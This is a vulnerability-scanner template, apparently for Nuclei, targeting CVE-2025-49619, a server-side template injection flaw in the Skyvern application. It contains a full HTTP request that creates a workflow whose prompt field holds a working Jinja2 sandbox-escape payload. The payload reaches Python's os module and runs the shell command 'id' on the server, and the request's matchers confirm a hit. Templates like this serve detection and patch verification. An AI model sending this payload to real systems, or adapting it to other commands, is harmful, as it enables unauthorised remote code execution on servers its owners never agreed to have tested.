id: CVE-2025-49619

info:
  name: Skyvern RCE via SSTI
  author: Gaurang
  severity: critical
  description: |
    This template detects Remote Code Execution (RCE) vulnerability in Skyvern application via Server-Side Template Injection (SSTI).
    Successful exploitation allows an attacker to execute arbitrary commands on the server.
  tags: ssti,rce,critical

variables:
  api_key: "REPLACE_WITH_API_KEY"

http:
  - raw:
      - |
        POST /api/v1/workflows HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        X-API-Key: {{api_key}}

        {
          "title": "Exploit",
          "description": "",
          "proxy_location": "RESIDENTIAL",
          "webhook_callback_url": "",
          "persist_browser_session": false,
          "model": null,
          "totp_verification_url": null,
          "workflow_definition": {
            "parameters": [],
            "blocks": [
              {
                "label": "block_1",
                "continue_on_failure": false,
                "block_type": "task_v2",
                "prompt": "{% for x in ().__class__.__base__.__subclasses__() %}{% if 'warning' in x.__name__ %}{{ x()._module.__builtins__['__import__']('os').popen('id').read() }}{% endif %}{% endfor %}",
                "url": "",
                "max_steps": 25,
                "totp_identifier": null,
                "totp_verification_url": null
              }
            ]
          },
          "is_saved_task": false
        }

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "workflow_permanent_id"
      - type: status
        status:
          - 200
